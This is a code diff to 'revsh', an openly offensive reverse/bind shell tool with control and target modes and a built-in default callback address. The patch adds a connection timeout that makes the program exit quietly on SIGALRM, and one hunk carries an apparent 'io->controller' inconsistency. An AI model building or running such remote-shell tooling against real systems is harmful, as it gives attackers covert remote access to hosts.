@@ -45,7 +45,7 @@
  *
  **********************************************************************************************************************/
 void usage(){
-	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] ADDRESS:PORT\n", \
+	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] [-t SECONDS] ADDRESS:PORT\n", \
 			program_invocation_short_name);
 	fprintf(stderr, "\n\t-c\t\tRun in \"control\" mode.\t\t\t\t(Default is \"target\" mode.)\n");
 	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is Ephemeral Diffie-Hellman w/cert pinning.)\n");
@@ -56,6 +56,7 @@ void usage(){
 	fprintf(stderr, "\t\t\tNote:  * The -b flag will need to be given on both the control and target hosts.\n");
 	fprintf(stderr, "\t\t\t       * Bind shell mode can also be enabled by invoking the binary as \"bindsh\" instead of \"revsh\".\n");
 	fprintf(stderr, "\t-k\t\tStart the bind shell in \"keep-alive\" mode.\t(Ignored in reverse shell mode.)\n");
+	fprintf(stderr, "\t-t\t\tSet the connection timeout to SECONDS.\t\t(Default is 3600.)\n");
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
 	fprintf(stderr, "\n\tNote: ADDRESS:PORT is an optional argument and revsh will default to the values built into the binary.\n");
 	fprintf(stderr, "\t      The default ADDRESS:PORT for this build is \"%s\".\n", ADDRESS);
@@ -88,6 +89,20 @@ int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
 	return(1);
 }
 
+
+/*******************************************************************************
+ * 
+ * catch_alarm()
+ *
+ * Input: The signal being handled. (SIGALRM)
+ * Output: None. 
+ * 
+ * Purpose: To catch SIGALRM and exit quietly.
+ * 
+ ******************************************************************************/
+void catch_alarm(int signal){
+  exit(-signal);
+}
 
 
 /***********************************************************************************************************************
@@ -174,6 +189,8 @@ int main(int argc, char **argv){
 	int bindshell = 0;
 	int keepalive = 0;
 
+	int timeout = TIMEOUT;
+	struct sigaction act;
 
 	/*
 	 * Basic initialization.
@@ -182,7 +199,7 @@ int main(int argc, char **argv){
 	io.controller = 0;
 	io.encryption = EDH;
 
-	while((opt = getopt(argc, argv, "pbkacs:d:r:h")) != -1){
+	while((opt = getopt(argc, argv, "pbkacs:d:r:ht:")) != -1){
 		switch(opt){
 
 			// plaintext
@@ -222,6 +239,17 @@ int main(int argc, char **argv){
 			case 'r':
 				rc_file = optarg;
 				break;
+
+			case 't':
+			errno = 0;
+			timeout = strtol(optarg, NULL, 10);
+			if(errno){
+				fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
+						program_invocation_short_name, io.controller, optarg, \
+						strerror(errno));
+				usage();
+			}
+			break;
 
 			case 'h':
 			default:
@@ -426,10 +454,20 @@ int main(int argc, char **argv){
 			}
 		}
 
+		act.sa_handler = catch_alarm;
+
+    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+          program_invocation_short_name, io.controller, \
+          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+			exit(-1);
+    }
+
+		alarm(timeout);
 
 		if(bindshell){
 
-			// - Open a network connection back to a controller.
+			// - Open a network connection back to the target.
 			if((io.connect = BIO_new_connect(buff_head)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
 						program_invocation_short_name, io.controller, buff_head, strerror(errno));
@@ -486,6 +524,17 @@ int main(int argc, char **argv){
 
 			BIO_free(accept);
 		}
+
+		act.sa_handler = SIG_DFL;
+
+    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+          program_invocation_short_name, io.controller, \
+          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+    	exit(-1);
+    }
+
+		alarm(0);
 
 		printf("\tConnected!\n");
 
@@ -1006,6 +1055,19 @@ int main(int argc, char **argv){
 			}
 		}
 
+		act.sa_handler = catch_alarm;
+
+    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+#ifdef DEBUG
+      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+          program_invocation_short_name, io.controller, \
+          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+#endif
+			exit(-1);
+    }
+
+		alarm(timeout);
+
 		if(bindshell){
 			// - Listen for a connection.
 
@@ -1027,6 +1089,7 @@ int main(int argc, char **argv){
 
 				if(accept){
 					BIO_free(accept);
+					alarm(timeout);
 				}
 
 				if((accept = BIO_new_accept(buff_head)) == NULL){
@@ -1122,6 +1185,19 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 		}
+
+		act.sa_handler = SIG_DFL;
+
+    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+#ifdef DEBUG
+      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+          program_invocation_short_name, io->controller, \
+          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+#endif
+			exit(-1);
+    }
+
+		alarm(0);
 
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 #ifdef DEBUG
